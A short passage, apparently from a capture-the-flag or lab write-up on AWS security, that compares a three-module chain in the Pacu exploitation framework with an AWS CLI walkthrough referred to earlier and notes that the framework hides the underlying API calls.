Three modules, one flag. The Pacu chain is shorter to type than the AWS CLI version because the framework handles session identity, region iteration and output persistence, but it hides the exact API calls behind module names, so the AWS CLI walkthrough above is still the one to read for *what* is going wrong at the AWS level.
